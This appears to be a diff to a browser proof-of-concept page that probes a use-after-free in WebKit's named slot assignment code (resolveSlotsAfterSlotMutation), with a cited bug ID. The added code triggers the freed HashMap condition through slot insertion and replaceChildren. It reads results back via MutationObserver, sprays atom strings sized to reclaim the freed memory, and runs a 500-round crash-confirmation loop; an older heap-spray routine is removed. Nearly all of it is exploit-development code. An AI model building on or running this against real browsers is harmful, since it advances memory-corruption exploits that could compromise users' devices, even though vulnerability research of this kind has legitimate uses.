+        sigs.push(`mo=NOT-FIRED`);
+      } else {
+        sigs.push(`mo=fired(×${moFired})`);
+        if(moAssignedLen !== 1){
+          if(moAssignedLen === 0) sigs.push(`mo-an=0(UAF-zeroed)`);
+          else if(moAssignedLen === -999){ sigs.push(`mo-an=THREW`); anyHit=true; noteUAF(`${label}-mo-threw`); }
+          else { sigs.push(`mo-an=${moAssignedLen}(CORRUPT)`); anyHit=true; noteUAF(`${label}-mo-corrupt`); }
+        } else {
+          sigs.push(`mo-an=1(ok)`);
+        }
+        // Check addedNodes / removedNodes for corruption
+        for(const n of moAdded.slice(0,4)){
+          if(!n){ sigs.push(`mo-added=NULL`); anyHit=true; noteUAF(`${label}-mo-added-null`); break; }
+          try {
+            const nt = n.nodeType;
+            if(nt!==1&&nt!==3){ sigs.push(`mo-added-nodeType=${nt}(CORRUPT)`); anyHit=true; noteUAF(`${label}-mo-added-corrupt`); }
+          } catch(e2){ sigs.push(`mo-added-THREW`); anyHit=true; noteUAF(`${label}-mo-added-threw`); break; }
+        }
+        for(const n of moRemoved.slice(0,4)){
+          if(!n){ sigs.push(`mo-removed=NULL`); anyHit=true; noteUAF(`${label}-mo-removed-null`); break; }
+          try {
+            const nt = n.nodeType;
+            if(nt!==1&&nt!==3){ sigs.push(`mo-removed-nodeType=${nt}(CORRUPT)`); anyHit=true; noteUAF(`${label}-mo-removed-corrupt`); }
+          } catch(e2){ sigs.push(`mo-removed-THREW`); anyHit=true; noteUAF(`${label}-mo-removed-threw`); break; }
+        }
+      }
+
+      // slotchange readback
+      if(scFired > 0){
+        sigs.push(`sc=fired(×${scFired})`);
+        if(scAssignedLen !== 1){
+          if(scAssignedLen===0) sigs.push(`sc-an=0(UAF-zeroed)`);
+          else if(scAssignedLen===-999){ sigs.push(`sc-an=THREW`); anyHit=true; noteUAF(`${label}-sc-threw`); }
+          else { sigs.push(`sc-an=${scAssignedLen}(CORRUPT)`); anyHit=true; noteUAF(`${label}-sc-corrupt`); }
+        } else {
+          sigs.push(`sc-an=1(ok)`);
+        }
+      } else {
+        sigs.push(`sc=NOT-FIRED`);
+      }
+
+      if(triggerThrew) { sigs.push(`trigger-THREW:${triggerThrew}`); anyHit=true; }
+
+      resolve({ sig: sigs.join(' | '), anyHit, postTriggerLen, moFired, scFired, moAssignedLen, scAssignedLen });
+    }, 50);
+  });
 }
 
-function runNamed() {
+// ─────────────────────────────────────────────────────────────────────────────
+// NAMED-MO RUN
+// ─────────────────────────────────────────────────────────────────────────────
+async function runNamed() {
   dis(true); uafTotal=0; L.innerHTML='';
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  NAMED-SPRAY · NamedSlotAssignment resolveSlotsAfterSlotMutation ║','hi');
-  log('║  rdar://174493428 · bug 312247 · commit 20beac1f6e           ║','hi');
-  log('║  v90 confirmed WRONG-len=0 on all probes (freed mem reads 0) ║','hi');
+  log('║  NAMED-MO · MutationObserver live readback                   ║','hi');
+  log('║  rdar://174493428 · No heap spray needed                     ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-  log('  Hypothesis: bmalloc zeroes freed HashMap storage → m_size=0 → empty', 'inf');
-  log('  Strategy: spray IMMEDIATELY after trigger to win race vs zeroing', 'inf');
+  log('  Reading assignedNodes() via MO callback and direct slotchange listener','inf');
+  log('  Post-trigger read: synchronous before microtask flush','inf');
+  log('  MO read: post-microtask (after resolveSlotsAfterSlotMutation returns)','inf');
   log('');
 
   const sums = [];
-  const allBufs = [];
 
-  // Test: spray BEFORE trigger (pre-fill freed region from earlier allocations)
-  // AND spray AFTER trigger (reclaim freshly freed)
+  // Vary numUnique slots to force different HashMap sizes / rehash timing
   const configs = [
-    { numUnique:4,  label:'u4'  },
-    { numUnique:8,  label:'u8'  },
-    { numUnique:16, label:'u16' },
-    { numUnique:32, label:'u32' },
+    { numUnique:4,  spray:false, sCharLen:0,  label:'u4-noSpr'  },
+    { numUnique:8,  spray:false, sCharLen:0,  label:'u8-noSpr'  },
+    { numUnique:16, spray:false, sCharLen:0,  label:'u16-noSpr' },
+    { numUnique:32, spray:false, sCharLen:0,  label:'u32-noSpr' },
+    // With atom spray — 8-char unique slot names → ~48B StringImpl
+    { numUnique:4,  spray:true,  sCharLen:8,  label:'u4-spr8'   },
+    { numUnique:8,  spray:true,  sCharLen:8,  label:'u8-spr8'   },
+    { numUnique:16, spray:true,  sCharLen:16, label:'u16-spr16' },
+    { numUnique:32, spray:true,  sCharLen:16, label:'u32-spr16' },
   ];
 
-  let ci=0, si=0;
-
-  function nextProbe() {
-    if(si >= SPRAY_SIZES.length){
-      log('');
-      log('╔══════════════════════════════════════════════════════════════╗','hi');
-      log('║  NAMED-SPRAY SUMMARY                                         ║','hi');
-      log('╠══════════════════════════════════════════════════════════════╣','hi');
-      for(const s of sums){
-        const hit = s.includes('SPRAY-HIT')||s.includes('WRONG')||s.includes('THREW')||s.includes('CORRUPT');
-        log('║  '+(s).substring(0,60).padEnd(60)+'║', hit?'hit':'ok');
-      }
-      log('╠══════════════════════════════════════════════════════════════╣','hi');
-      log(`║  Total UAF signals: ${String(uafTotal).padEnd(40)}║`, uafTotal>0?'hit':'inf');
-      log('╚══════════════════════════════════════════════════════════════╝','hi');
-      allBufs.length = 0;
-      dis(false);
-      return;
-    }
-
-    const sz  = SPRAY_SIZES[si];
-    const cfg = configs[ci];
-
-    log(`── Named spray sz=${sz} numUnique=${cfg.numUnique} ──`, 'dim');
-
-    // PRE-SPRAY: fill the allocator's free list with our pattern before triggering
-    // so the rehash gets our bytes from the free list
-    allBufs.push(...doSpray(sz));
-
-    const rig = makeNamedRig(cfg.label+`sz${sz}`, cfg.numUnique);
-    const r   = triggerNamedAndSpray(rig, sz, allBufs);
-    const sig = r.thrown || r.wrongLen || r.readback || 'clean';
-    const hit = !!(r.thrown || r.wrongLen || r.sprayHit);
-    const line = `[sz=${sz} uniq=${cfg.numUnique}] ${sig}`;
-    log(`  ${line}`, hit?'hit':'ok');
-    sums.push(line);
-
-    ci++;
-    if(ci >= configs.length){ ci=0; si++; }
-
-    setTimeout(nextProbe, 0);
+  for(const cfg of configs){
+    const sprayStr = cfg.spray ? ` +atomSpr(${cfg.sCharLen}ch)` : '';
+    log(`── ${cfg.label}${sprayStr} ──`, 'dim');
+    const r = await probeNamedMO(cfg.label, cfg.numUnique, cfg.spray, cfg.sCharLen);
+    const line = `[${cfg.label}] ${r.sig}`;
+    log(`  ${line}`, r.anyHit ? 'hit' : (r.moFired>0&&r.scFired>0 ? 'ok' : 'inf'));
+    sums.push({ line, hit: r.anyHit });
   }
-  setTimeout(nextProbe, 10);
+
+  log('');
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  NAMED-MO SUMMARY                                            ║','hi');
+  log('╠══════════════════════════════════════════════════════════════╣','hi');
+  for(const s of sums){
+    log('║  '+s.line.substring(0,60).padEnd(60)+'║', s.hit?'hit':'ok');
+  }
+  log('╠══════════════════════════════════════════════════════════════╣','hi');
+  log(`║  UAF signals: ${String(uafTotal).padEnd(46)}║`, uafTotal>0?'hit':'inf');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  dis(false);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// NAMED-2ND — second trigger: replaceChildren path + MO
+// ─────────────────────────────────────────────────────────────────────────────
+// This path: host.replaceChildren() → hostChildrenChanged → assignSlots invalidated
+// → removeSlotElementByName → resolveSlotsAfterSlotMutation(Removal)
+// The removal path iterates m_slots differently — may have different UAF timing
+
+function probeNamed2nd(label, numUnique) {
+  const rig = makeNamedRig(label, numUnique);
+  let postTriggerLen=-1, postRC2Len=-1, scCount=0, moCount=0;
+  let moAssignedLen=-1, anyHit=false, sigs=[];
+
+  const mo = new MutationObserver((mutations) => {
+    moCount++;
+    try {
+      moAssignedLen = rig.slot1.assignedNodes().length;
+    } catch(e){ moAssignedLen=-999; anyHit=true; noteUAF(`${label}-2nd-mo-threw`); }
+  });
+  mo.observe(rig.slot1, { childList:true });
+  rig.slot1.addEventListener('slotchange', ()=>{ scCount++; });
+
+  // TRIGGER 1: insertBefore (Insertion path)
+  try {
+    const slot3 = document.createElement('slot'); slot3.name='primary';
+    rig.sr.insertBefore(slot3, rig.slot1);
+    void rig.host.getBoundingClientRect();
+    postTriggerLen = rig.slot1.assignedNodes().length;
+  } catch(e){ sigs.push(`T1-THREW:${e.message}`); anyHit=true; noteUAF(`${label}-T1-threw`); }
+
+  return new Promise(resolve => {
+    setTimeout(() => {
+      // TRIGGER 2: replaceChildren (Removal path)
+      try {
+        rig.host.replaceChildren();
+        void rig.host.getBoundingClientRect();
+        postRC2Len = rig.slot1.assignedNodes().length;
+      } catch(e){ sigs.push(`T2-THREW:${e.message}`); anyHit=true; noteUAF(`${label}-T2-threw`); }
+
+      setTimeout(() => {
+        mo.disconnect();
+        try { CONTAINER.removeChild(rig.host); } catch(_){}
+
+        if(postTriggerLen!==1) sigs.push(`T1-post=${postTriggerLen}(${postTriggerLen===0?'UAF-zero':'WRONG'})`);
+        else sigs.push(`T1-post=1(ok)`);
+        if(postRC2Len!==0) sigs.push(`T2-post=${postRC2Len}(WRONG-expZero)`);
+        else sigs.push(`T2-post=0(ok)`);
+        sigs.push(`mo=×${moCount} sc=×${scCount}`);
+        if(moAssignedLen!==-1) sigs.push(`mo-an=${moAssignedLen}`);
+
+        if(postTriggerLen!==1&&postTriggerLen!==0) { anyHit=true; noteUAF(`${label}-T1-wronglen`); }
+        if(postRC2Len!==0&&postRC2Len!==-1) { anyHit=true; noteUAF(`${label}-T2-wronglen`); }
+
+        resolve({ sig: sigs.join(' | '), anyHit });
+      }, 50);
+    }, 0);
+  });
+}
+
+async function runNamed2() {
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  NAMED-2ND · replaceChildren Removal path + MO readback      ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+  const sums=[];
+  for(const nu of [4,8,16,32]){
+    log(`── u${nu} ──`,'dim');
+    const r = await probeNamed2nd(`2nd-u${nu}`, nu);
+    const line = `[u${nu}] ${r.sig}`;
+    log(`  ${line}`, r.anyHit?'hit':'ok');
+    sums.push({ line, hit:r.anyHit });
+  }
+  log('');
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  NAMED-2ND SUMMARY                                           ║','hi');
+  log('╠══════════════════════════════════════════════════════════════╣','hi');
+  for(const s of sums) log('║  '+s.line.substring(0,60).padEnd(60)+'║', s.hit?'hit':'ok');
+  log(`╠═ UAF signals: ${String(uafTotal).padEnd(46)}╣`,'hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  dis(false);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// LOOP ×500 — stress the best config
+// ─────────────────────────────────────────────────────────────────────────────
+async function runLoop() {
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  LOOP ×500 · stress best config · crash = unpatched CONFIRMED ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('  Running 500 rounds, u16 + u32 alternating...','inf');
+
+  let thrown=0, zero=0, corrupt=0, ok=0;
+
+  for(let i=0; i<500; i++){
+    const nu = (i%2===0)?16:32;
+    const rig = makeNamedRig(`lp${i}`, nu);
+    try {
+      const slot3=document.createElement('slot'); slot3.name='primary';
+      rig.sr.insertBefore(slot3, rig.slot1);
+      void rig.host.getBoundingClientRect();
+      const an=rig.slot1.assignedNodes();
+      if(an.length===0) zero++;
+      else if(an.length===1) ok++;
+      else { corrupt++; noteUAF(`loop-corrupt:${i}:len=${an.length}`); }
+    } catch(e){ thrown++; noteUAF(`loop-threw:${i}`); }
+    try { CONTAINER.removeChild(rig.host); } catch(_){}
+    if(i%100===99) log(`  ${i+1}/500: ok=${ok} zero=${zero} corrupt=${corrupt} threw=${thrown}`,'dim');
+    if(i%50===49) await new Promise(r=>setTimeout(r,0));
+  }
+
+  log('');
+  log(`  DONE: ok=${ok} zero=${zero} corrupt=${corrupt} threw=${thrown} uaf_signals=${uafTotal}`,
+       corrupt||thrown?'hit':'ok');
+  if(zero>0) log(`  zero=${zero} — UAF confirmed, assignment corruption consistent`, 'inf');
+  if(corrupt>0) log(`  corrupt=${corrupt} — non-zero wrong length — partial spray or new corruption mode`, 'hit');
+  dis(false);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────────────────
-function runAll(){
+async function runAll() {
   dis(true); L.innerHTML=''; uafTotal=0;
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v91 RUN ALL · ManualSlot + NamedSlot Heap Spray             ║','hi');
+  log('║  v93 RUN ALL · NAMED-MO + NAMED-2ND + LOOP ×500              ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-
-  // Run manual first, then named
-  uafTotal=0;
-  // Inline manual run, on completion chain to named
-  const L2 = L;
-  function manualDone() {
-    log('');
-    log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━','hi');
-    log('  Pivoting to NAMED-SPRAY...','inf');
-    log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━','hi');
-    log('');
-    runNamed();
-  }
-
-  // just call runManual — it will dis(false) at end, which we override
-  // Actually simplest: just call in sequence, override the dis
-  runManual();
-  // After runManual finishes it calls dis(false); we need a hook.
-  // Simplest approach: poll for when bMan is re-enabled, then start named
-  const poller = setInterval(()=>{
-    const b = document.getElementById('bMan');
-    if(b && !b.disabled){
-      clearInterval(poller);
-      dis(true);
-      manualDone();
-    }
-  }, 200);
+  await runNamed();
+  log('');
+  log('━━━━━━━━━━━━ NAMED-2ND ━━━━━━━━━━━━','hi');
+  log('');
+  await runNamed2();
+  log('');
+  log('━━━━━━━━━━━━ LOOP ×500 ━━━━━━━━━━━━','hi');
+  log('');
+  await runLoop();
+  dis(false);
 }
 </script>
 </body>
